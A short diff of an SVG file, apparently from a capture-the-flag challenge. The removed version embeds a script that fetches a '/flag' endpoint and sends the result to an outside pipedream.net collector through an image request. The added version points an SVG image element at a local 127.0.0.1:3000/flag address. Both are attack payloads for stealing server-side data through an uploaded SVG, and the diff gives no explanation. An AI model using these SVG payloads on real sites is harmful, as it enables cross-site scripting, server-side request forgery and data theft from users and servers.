@@ -1,14 +1,5 @@
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script><![CDATA[
-    fetch('/flag')
-      .then(r => r.text())
-      .then(flag => {
-        new Image().src = 'https://eokqbbiypxqueat.m.pipedream.net/?flag=' + encodeURIComponent(flag);
-      })
-      .catch(e => {
-        new Image().src = 'https://eokqbbiypxqueat.m.pipedream.net/?error=' + encodeURIComponent(e.message);
-      });
-  ]]></script>
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">
+  <image href="http://127.0.0.1:3000/flag" height="100" width="100"/>
 </svg>
 
 
